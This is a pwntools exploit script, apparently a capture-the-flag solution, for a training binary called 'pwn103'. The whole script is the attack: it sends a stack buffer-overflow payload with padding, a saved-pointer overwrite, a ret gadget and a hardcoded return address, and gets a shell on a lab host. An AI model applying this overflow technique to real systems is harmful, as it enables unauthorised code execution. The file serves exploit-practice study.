from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
local = False
file = './pwn103'
host = "10.10.117.144"
port = 9003


#The overall offset is 40, the first 32 are to clobber the buffer space, the last 8 clobber the saved BP
offset_to_ip = 0x20 #32 decimal
overwrite_bp = 0x8  #8 decimal

#admin_functions address is static at this memory address
return_address = p64(0x00401554) 

#to address MOVAPS stack alignment issue - refer to ROPEmporium common pitfalls https://ropemporium.com/guide.html
ret_gadget = p64(0x0000000000401016) 
payload = b'A' * offset_to_ip + b'B' * overwrite_bp + ret_gadget + return_address


#Local Testing
gdb_script = f"""
break *0x0000000000401554 #this is the function we want to return into
"""
if local:
	elf = context.binary = ELF(file)

	p = gdb.debug(file, gdbscript=gdb_script)
	#p = process()
	print(p.recvuntil(b": "))
	p.sendline(b'3')
	print(p.recvuntil(b"er]: "))
	p.sendline(payload)
	p.interactive()
else:
	conn = remote(host,port)
	conn.recvuntil(b": ")
	conn.sendline(b'3')
	conn.recvuntil(b"er]: ")
	conn.sendline(payload)
	conn.interactive()